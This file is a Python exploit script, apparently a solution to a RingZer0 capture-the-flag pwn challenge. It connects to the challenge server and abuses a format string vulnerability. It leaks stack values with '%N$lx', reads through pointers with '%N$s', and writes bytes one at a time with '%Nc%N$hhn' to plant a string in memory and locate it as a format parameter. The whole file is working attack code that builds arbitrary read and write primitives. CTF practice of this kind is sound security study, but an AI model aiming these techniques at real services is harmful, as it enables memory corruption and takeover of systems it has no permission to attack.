from socket import * 
import struct
'''
def grab(i):
    s=socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))
    s.recv(128)
    s.send("%"+str(i)+"$lx\n")

    data=s.recv(64)
    addr=data.split()[0]

    print i, addr
    s.close()

for z in range(700):
    grab(z)
'''
def grab_value_directly(i):
    s=socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))
    s.recv(128)
    s.send("%"+str(i)+"$lx\n")
    
    data=s.recv(64)
    addr=int(data.split()[0], 16)
    s.close()

    return addr
def grab_value_indirectly(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$s\n')
    
    data = s.recv(64)
    addr = data.split()[0]

    # ugly workaround, only grab 8 bytes. will fix this later!
    if len(addr) > 8:
        address = addr[0:8]
    else:
        address = addr + '\x00' * (8-len(addr))
    
    s.close()
    return struct.unpack('L', address)[0]

def write_byte_value_via(i, value):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(value)+'c%'+str(i)+'$hhn\n')
    data = s.recv(64)

    s.close()

parameter_636_addr = grab_value_directly(5)
print "parameter 5 points to: ", hex(parameter_636_addr)
value_at_636 = grab_value_indirectly(5)
print "address pointed to by parameter 5 contains: ", hex(value_at_636)

# this will write out 'BAS',0 to the scratch area!
# update the pointer
write_byte_value_via(5, 1)
# write a byte to the scratch area
write_byte_value_via(636, ord('B'))
# update the pointer
write_byte_value_via(5, 2)
# write a byte to the scratch area
write_byte_value_via(636, ord('A'))
write_byte_value_via(5, 3)
write_byte_value_via(636, ord('S'))
write_byte_value_via(5, 4)
# write out a NULL byte first writing out 256 bytes (which wraps to 0x00)
write_byte_value_via(636, 256)

# reset the pointer
write_byte_value_via(5, 1)

value_at_scratch = grab_value_indirectly(636)
print "scratch contains: ", hex(value_at_scratch)

format_offset = ((value_at_636 & 0xffffffffffffff00) - parameter_636_addr)/8
print "scratch is parameter {}".format(636+format_offset)

# CAN ADDRESS IT DIRECTLY!!
scratch_addr = grab_value_directly(636+format_offset)
print "scratch contains: ", hex(scratch_addr)